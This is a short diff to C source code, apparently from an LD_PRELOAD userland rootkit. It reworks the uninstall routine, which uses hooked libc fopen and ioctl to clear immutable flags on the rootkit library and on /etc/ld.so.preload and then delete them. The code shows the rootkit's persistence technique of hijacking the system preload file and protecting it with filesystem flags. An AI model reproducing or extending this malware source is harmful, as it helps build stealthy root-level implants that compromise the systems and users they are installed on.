@@ -162,32 +162,41 @@ void uninstall(){
     if (!hooked_fopen){
         hooked_fopen = load_libc("fopen");
     }
-    FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
-    if (!f){
-        #ifdef DEBUG
-        printf("[-] no write permission\n");
-        #endif
-        return;
+    if (!hooked_ioctl){
+        hooked_ioctl = load_libc("ioctl");
     }
-    int fd = fileno(f);
+
     unsigned long flags = 0;
-    hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
-    fclose(f);
-    unlink(MAGIC_LIBPATH);
+    struct stat buffer;
+
+    if (stat(MAGIC_LIBPATH, &buffer) == 0){
+        FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
+        if (!f){
+            #ifdef DEBUG
+            printf("[-] no write permission\n");
+            #endif
+            return;
+        }
+        int fd = fileno(f);
+        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+        fclose(f);
+        unlink(MAGIC_LIBPATH);
+    }
 
     char ldpath[] = "/etc/ld.so.preload";
-    FILE *fld = hooked_fopen(ldpath, "r");
-    if (!fld){
-        #ifdef DEBUG
-        printf("[-] no write permission\n");
-        #endif
-        return;
+    if (stat(ldpath, &buffer) == 0){
+        FILE *fld = hooked_fopen(ldpath, "r");
+        if (!fld){
+            #ifdef DEBUG
+            printf("[-] no write permission\n");
+            #endif
+            return;
+        }
+        int fd = fileno(fld);
+        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+        fclose(fld);
+        unlink(ldpath);
     }
-    fd = fileno(fld);
-    hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
-    fclose(fld);
-    unlink(ldpath);
-
 }
 
 /*
